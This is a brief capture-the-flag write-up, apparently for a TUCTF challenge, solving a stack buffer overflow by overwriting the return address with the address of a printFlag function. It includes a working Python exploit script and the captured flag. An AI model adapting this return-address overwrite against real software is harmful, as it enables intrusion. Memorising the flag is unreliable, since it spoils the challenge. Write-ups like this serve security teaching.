> Get warmed up, we'll be here for a while.

Solved by Vanilla

This binary also has a stack-based buffer overflow, but it has NX enabled.  However, PIE is turned off, so we have static addresses to parts of the binary.  Fortunately, nm tells us that it has a printFlag function at 0x80491F6, so we can overwrite the return address to go straight there.  I wasn’t feeling like trying to figure out the exact number of things we need to overwrite so I just flooded the input with that pointer over and over:

#!/usr/bin/env python3
import struct
import vanillib

def exploit(iface):
    iface.expect(b"Let's see what you can do\n> ")
    iface.write(struct.pack('<Q', 0x080491f6) * 10 + b"\n")
    print(iface.read_some())

main = vanillib.stub_main(exploit)

if __name__ == "__main__":
    main()

Flag: TUCTF{0n3_d0wn..._50_m4ny_70_60}

